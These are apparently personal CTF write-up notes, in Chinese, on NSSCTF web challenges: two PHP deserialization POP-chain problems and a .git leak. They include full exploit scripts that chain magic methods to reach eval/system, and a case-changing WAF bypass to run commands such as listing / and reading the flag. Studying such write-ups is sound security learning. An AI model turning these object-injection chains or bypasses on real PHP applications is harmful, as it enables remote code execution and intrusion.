# NSSCTF



## Web

### [NISACTF 2022]babyserialize

pop链+RCE

```php
<?php
include "waf.php";
class NISA{
  public $fun="show_me_flag";
  public $txw4ever;
  public function __wakeup()
  {
    if($this->fun=="show_me_flag"){
      hint();
    }
  }

  function __call($from,$val){
    $this->fun=$val[0];
  }

  public function __toString()
  {
    echo $this->fun;
    return " ";
  }
  public function __invoke()
  {
    checkcheck($this->txw4ever);
    @eval($this->txw4ever);
  }
}

class TianXiWei{
  public $ext;
  public $x;
  public function __wakeup()
  {
    $this->ext->nisa($this->x);
  }
}

class Ilovetxw{
  public $huang;
  public $su;

  public function __call($fun1,$arg){
    $this->huang->fun=$arg[0];
  }

  public function __toString(){
    $bb = $this->su;
    return $bb();
  }
}

class four{
  public $a="TXW4EVER";
  private $fun='abc';

  public function __set($name, $value)
  {
    $this->$name=$value;
    if ($this->fun = "sixsixsix"){
      strtolower($this->a);
    }
  }
}

if(isset($_GET['ser'])){
  @unserialize($_GET['ser']);
}else{
  highlight_file(__FILE__);
}

//func checkcheck($data){
// if(preg_match(......)){
//   die(something wrong);
// }
//}

//function hint(){
//  echo ".......";
//  die();
//}
?>
```

#### 预期解

先找漏洞点，NISA类的__invoke()方法中会调用eval方法，并将txw4ever作为参数传入，进行命令执行

怎么样才能调用NISA函数的invoke()方法呢，当尝试以调用函数的方式调用一个对象时，invoke() 方法会被自动调用。

eg:

```
<?php
class Person
{
    public function __invoke() {
        echo '这可是一个对象哦';
    }
}
$person = new Person(); 
$person();

'''
这可是一个对象哦
```

我们可以通过Ilovetxw类的__toString()方法将实例化后的NISA函数当作函数来调用，从而触发\_\_invoke()方法

再看如何触发Ilovetxw类的__toString()方法，我们需要将Ilovetxw类的对象以字符串的形式进行调用即可触发。

```php
  public function __set($name, $value)
  {
    $this->$name=$value;
    if ($this->fun = "sixsixsix"){
      strtolower($this->a);
    }
  }
```

four类的__set方法中当fun="sixsixsix"时会调用strtolower函数，改函数会将字符串转换为小写，也就是说我们如果将Ilovetxw类的对象作为参数传入，即可触发\_\_toString()方法

当调用类中不存在的变量或者不可访问的变量时会触发__set方法，我们可以找到Ilovetxw类的\_\_call方法

```php
  public function __call($fun1,$arg){
    $this->huang->fun=$arg[0];
  }
```

我们如果将four类的对象传入，由于four类的fun变量不可访问，所以可以触发__set()方法

最后我们可以通过TianXiWei类的__wakeup()方法调用Ilovetxw类的nisa方法，而Ilovetxw类中不存在这个方法，触发\_\_call()方法，这样一整条pop链就构造好了

exp:

```
<?php
class NISA{
    public $fun;
    public $txw4ever='system("ls /");';/1 system
}
class TianXiWei{
    public $ext;				//6 Ilovetxw
    public $x;
}
class Ilovetxw{
    public $huang;				//5 four
    public $su;					//2 NISA
}
class four{
    public $a;		//3 Ilovetxw
    private $fun="sixsixsix";	//4 fun="sixsixsix"
}
$a=new NISA();
$b = new Ilovetxw();
$c=new four();
$d=new TianXiWei();
$b->su = $a;
$c->a = $b;
$b->huang = $c;
$d->ext = $b;
echo urlencode(serialize($d));
?>
```

但是由于存在waf，我们没办法直接进行命令执行

php对大小写不敏感，考虑进行大小写绕过

```
<?php
class NISA{
    public $fun;
    public $txw4ever='SYSTEM("ls /");';/1 system
}
class TianXiWei{
    public $ext;				//6 Ilovetxw
    public $x;
}
class Ilovetxw{
    public $huang;				//5 four
    public $su;					//2 NISA
}
class four{
    public $a;		//3 Ilovetxw
    private $fun="sixsixsix";	//4 fun="sixsixsix"
}
$a=new NISA();
$b = new Ilovetxw();
$c=new four();
$d=new TianXiWei();
$b->su = $a;
$c->a = $b;
$b->huang = $c;
$d->ext = $b;
echo urlencode(serialize($d));
?>
```

成功执行命令，在根目录读到flag



另外通过NISA类的__wakeup()方法可以得到flag的位置在/

```
  public function __wakeup()
  {
    if($this->fun=="show_me_flag"){
      hint();
    }
  }
```

![img](assets/c002032291ce5a71e2c27fe5cc8c1df1.png)

#### 非预期

```php
class NISA{
    public $txw4ever='SYSTEM("cat /f*");';
}
class Ilovetxw{
}

$a = new NISA();
$a->fun = new Ilovetxw();
$a->fun->su = $a;
$a = serialize($a);
echo $a;
```

在NISA的wakeup方法进行弱比较就可以触发tostring方法了，这样一来链子就缩短了



### [NCTF 2018]全球最大交友网站

./git泄露

![image-20250110091935877](assets/image-20250110091935877.png)

```
git log
```



![image-20250110092123503](assets/image-20250110092123503.png)

```
git show HEAD 02b7
```

![image-20250110092202450](assets/image-20250110092202450.png)

```
diff --git a/readme.txt b/readme.txt
```

![image-20250110110137825](assets/image-20250110110137825.png)

### [FSCTF 2023]ez_php2

pop链 php反序列化

```php
 <?php
highlight_file(__file__);
Class Rd{
    public $ending;
    public $cl;

    public $poc;
    public function __destruct()
    {
        echo "All matters have concluded";
        die($this->ending);
    }
    public function __call($name, $arg)
    {
        foreach ($arg as $key =>$value)
        {

            if($arg[0]['POC']=="1111")
            {
                echo "1";
                $this->cl->var1 = "system";
            }
        }
    }
}


class Poc{
    public $payload;

    public $fun;

    public function __set($name, $value)
    {
        $this->payload = $name;
        $this->fun = $value;
    }

    function getflag($paylaod)
    {
        echo "Have you genuinely accomplished what you set out to do?";
        file_get_contents($paylaod);
    }
}

class Er{
    public $symbol;
    public $Flag;

    public function __construct()
    {
        $this->symbol = True;
    }

    public function __set($name, $value)
    {
        $value($this->Flag);
    }


}

class Ha{
    public $start;
    public $start1;
    public $start2;
    public function __construct()
    {
        echo $this->start1."__construct"."</br>";
    }

    public function __destruct()
    {
        if($this->start2==="11111") {
            $this->start1->Love($this->start);
            echo "You are Good!";
        }
    }
}


if(isset($_GET['Ha_rde_r']))
{
    unserialize($_GET['Ha_rde_r']);
} else{
    die("You are Silly goose!");
}
?>

```

刚拿到这道题的时候，被POC中的getflag方法迷惑了挺久，没找到调用的方法，结合这句话"Have you genuinely accomplished what you set out to do?"可以看出这只是个烟雾弹

后面看到可以通过Rd类的__call方法触发Er类\_\_set方法实现命令执行，那就很清晰了

简单写一下链子

```
Ha.__destruct() -> Rd.__call() -> Er.__set
```

exp:

```php
<?php
Class Rd{
    public $ending;
    public $cl;
}

class Er{
    public $symbol;
    public $Flag = 'ls';
}

class Ha{
    public $start = ['POC' => '1111'];
    public $start1;
    public $start2 = "11111";
}

$a = new Rd();
$c = new Er();
$d = new Ha();
$a -> cl = $c;
$d -> start1 = $a;
echo urlencode(serialize($d));
?>
```

